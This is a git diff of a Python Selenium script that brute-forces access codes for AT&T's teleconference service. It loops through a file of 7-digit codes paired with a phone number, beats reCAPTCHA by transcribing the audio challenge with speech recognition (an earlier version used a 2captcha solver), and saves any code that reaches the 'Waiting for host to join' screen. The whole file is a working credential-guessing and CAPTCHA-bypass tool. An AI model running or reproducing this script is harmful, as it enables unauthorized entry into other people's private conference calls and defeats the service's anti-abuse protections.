@@ -1,5 +1,6 @@
 import selenium 
 from selenium import webdriver
+
 from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
@@ -7,10 +8,14 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.proxy import Proxy, ProxyType
 from selenium.webdriver.support.ui import Select
+#from selenium.webdriver.firefox.service import Service
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.firefox.options import Options
 from selenium.common.exceptions import NoSuchElementException
 from selenium.common.exceptions import TimeoutException
+from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
+from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
+from webdriver_manager.firefox import GeckoDriverManager
 import platform
 import time
 import random
@@ -18,38 +23,39 @@ import json
 from twocaptcha import solve_captcha
 from connectionStatus import is_connected
 from tqdm import tqdm
+from audioCaptcha import speech_rec
 
 
-#loading 7 digit codes and store in a list
-with open("doc/7digitcodes.txt", 'r') as file:
-    code7digits = file.readlines()
-#getting the phone number from the text file
-with open('doc/phonenumber.txt','r') as file:
-    number = file.read().strip()
 
 service = Service(executable_path = 'chromedriver.exe')
 
 
+
+
+
+
 options = webdriver.ChromeOptions()
-#options = Options()
+
+
 options.add_argument("--disable-notifications")
 options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36")
 #to disable the extensions
 options.add_argument("--disable-extensions")
 
 
-#this is to make it platform independent
-if platform.system().lower() == 'linux':
-    options.add_argument("--user-data-dir=cookies")
-elif platform.system().lower() == "windows" :
-    options.add_argument("--user-data-dir=C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 6")
+#binary = FirefoxBinary("C:\\Users\\Admin\\Desktop\\Tor Browser\\Browser\\firefox.exe")
 
 
-def main(code7):
+def main(code7 , number , driver):
+    
+
     target_site = "https://teleconference.uc.att.com/ecm/"
-    driver = webdriver.Chrome(service=service , options=options)
+    
+    
     driver.get(target_site)
-
+    print('The program has been stopped for 5 straight minute bruv')
+    time.sleep(300)
+    
     phone_number_input = WebDriverWait(driver , 10).until(EC.presence_of_element_located((By.XPATH , "//input[@id='bp']")))
     print('Page Load Succeeded')
     driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
@@ -88,38 +94,133 @@ def main(code7):
     print('Name DONE Bruv')
     #time.sleep(120) --------------------------------------------------------------------------------------------------------------------
     print('scraping the source (SRC) attribute from the recaptcha frame')
-    iframe = driver.find_element(By.XPATH , "//iframe[@title='reCAPTCHA']")
-    iframe_src = iframe.get_attribute('src')
-    print(iframe_src)
-    solved_captcha = solve_captcha(iframe_src , target_site)
-    #print(f'The extracte sitekey is {}')
-    #locating the captcha text area
+
+    try:
+        driver.switch_to.frame(driver.find_element(By.XPATH , "//iframe[@title='reCAPTCHA']"))
+        #iframe_src = iframe.get_attribute('src')
+        #google_captcha_response_input = driver.find_element(By.ID, 'g-recaptcha-response')
+        try:
+            captcha = WebDriverWait(driver , 5).until(EC.presence_of_element_located((By.XPATH , "//span[@id='recaptcha-anchor']")))
+            time.sleep(0.2)
+
+        except:
+            captcha = WebDriverWait(driver , 5).until(EC.presence_of_all_elements_located((By.XPATH , "//div[@id='rc-anchor-container']")))
+            time.sleep(0.2)
+        captcha.click()
+        driver.switch_to.default_content()
+        time.sleep(2)
+        driver.switch_to.frame(driver.find_element(By.XPATH , "//iframe[@title = 'recaptcha challenge expires in two minutes']"))
+
+        try:
+            print('Trying to click on the audio captcha button')
+            audio_button = driver.find_element(By.XPATH , "//button[@id='recaptcha-audio-button']")
+            audio_button.click()
+            print('Clicking on audio captcha was a success')
+            try:
+                try_later = WebDriverWait(driver , 5).until(EC.presence_of_all_elements_located((By.XPATH , "//div[@class='rc-doscaptcha-header-text' and text() = 'Try again later']")))
+                print('The Captcha showed to try later bro')
+            except:
+                print('Neither the code clicked on the audio button nor the captcha showed up bro')
+                pass
+        except:
+            try:
+                try_later = driver.find_element(By.XPATH , "//div[@class='rc-doscaptcha-header-text' and text() = 'Try again later']")
+                print('The Captcha showed to try later bro')
+                return 'again'
+            except:
+                print('Neither the code clicked on the audio button nor the captcha showed up bro')
+                return 'again'
+    except:
+        print('There was an error in the captcha section bro')
+        return 'again'
     
-    #driver.switch_to.frame(driver.find_element(By.XPATH , "//iframe[@title='reCAPTCHA']"))
-    #driver.switch_to.default_content()
-    #captcha_text_area = driver.find_element(By.XPATH , "//textarea[@id='g-recaptcha-response']")
-    #captcha_text_area.clear()
-    #driver.execute_script("document.getElementById('g-recaptcha-response').style.display = 'block';")
-    google_captcha_response_input = driver.find_element(By.ID, 'g-recaptcha-response')
+    audio_src = WebDriverWait(driver , 10).until(EC.presence_of_element_located((By.XPATH , "//audio[@id='audio-source']")))
+    the_audio_src = audio_src.get_attribute('src')
+    
+    print(f'The link to the audio is {the_audio_src} -------------------------------------- +++++ ')
+    audio_to_text = speech_rec(the_audio_src )
+
+    audio_captcha_input = driver.find_element(By.XPATH , "//input[@id='audio-response']")
+    for i in audio_to_text:
+        audio_captcha_input.send_keys(i)
+        time.sleep(random.uniform(0.2 , 0.6))
+    print('Clicking On the Verify button')
+    verify_button = driver.find_element(By.XPATH , "//button[@id='recaptcha-verify-button' and text()='Verify']")
+    verify_button.click()
+    driver.switch_to.default_content()
+
+
+    time.sleep(1.2)
+    print('Time to click on the CONTINUE BUTTON BRO +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++')
+    continue_button = driver.find_element(By.XPATH , "//button[@class='button button--appearance-square button--theme-dark button--role-none button--full-width button--enabled ' and text() = 'Continue']")
+    continue_button.click()
+
+
     time.sleep(1)
-    driver.execute_script("arguments[0].setAttribute('style','type: text; visibility:visible;');",google_captcha_response_input)
-    #driver.execute_script('document.getElementById("g-recaptcha-response").innerHTML = arguments[0]', solved_captcha)
+        
+    #correct id
+    try:
+        waiting_for_the_host = WebDriverWait(driver , 10).until(EC.presence_of_element_located((By.XPATH , "//div[@class='status__message']//p[text() = 'Waiting for host to join']")))
+        print('A correct code is found')
+        
+        time.sleep(2)
+        
+        with open('rightcode.txt' , 'a' , encoding = 'utf-8') as file:
+            file.write(code7)
+        print(f'{code7} turned out to be a correct and it has been saved in a separate file bro')
+        driver.refresh()
+        return 'notagain'
+        
+        
+        
+    except NoSuchElementException:
+        print('NO SUCH ELEMENT EXCEPTION OCCURED ---- !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
+        time.sleep(1)
+        driver.execute_script("window.scrollTo(0, 900);")
+        return 'again'
     
-    
-    #google_captcha_response_input.send_keys(solved_captcha)
-    #driver.execute_script("arguments[0].setAttribute('style', 'display:none;');",google_captcha_response_input)
-    #google_captcha_response_input.submit()
-    #driver.execute_script(f"document.getElementById('g-recaptcha-response').value = '{solved_captcha}';")
-    #driver.execute_script("arguments[0].value = arguments[1];", captcha_text_area, solved_captcha)
-    time.sleep(2)
-    continue_button = driver.find_element(By.XPATH , "//button[text()='Continue']")
-    time.sleep(0.2)
-    driver.execute_script("arguments[0].removeAttribute('disabled');", continue_button)
-    print('The Continue button has been enabled')
-    time.sleep(0.4)
-    #continue_button.click()
-    time.sleep(1)
-    time.sleep(120)
+    except TimeoutException:
+        time.sleep(1)
+        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
+        print('A TIMEOUT EXCEPTION OCCURED')    
+        return 'again'
+    except:
+        try:
+            driver.find_element(By.XPATH , "//div[@class='form__general-error-msg' and text()='Login failed. One or more of the credentials you entered is invalid.']")
+            
+            
+            driver.refresh()
+            return 'notagain'
+           
+        except:
+            print('This Aint no Login Failed Error Bruh Its something else : ->')
+        
+       
 
 if __name__ == '__main__':
-    main(code7digits[0])
+    driver = webdriver.Chrome( options=options)
+    #loading 7 digit codes and store in a list
+    with open("doc/7digitcodes.txt", 'r') as file:
+        code7digits = file.readlines()
+    print(f'7digitcodes.txt has been opened with {len(code7digits)} codes')
+    print(code7digits)
+    #getting the phone number from the text file
+    with open('doc/phonenumber.txt','r') as file:
+        number = file.read().strip()
+    
+    code_pointer = 0
+    for code in code7digits:
+        res = main(code , number  , driver )
+        while res == 'again':
+            driver.refresh()
+            res = main(code , number , driver )
+
+            if res == 'not again':
+                break
+        
+        code_pointer +=1
+
+        #managing the removal of used codes
+        with open('doc/7digitcodes.txt' , 'w' , encoding = 'utf-8') as file:
+            file.writelines(code7digits[code_pointer:])
+        print(f'{len(code7digits)} CODES REMAINIG FOR TEST BRO')
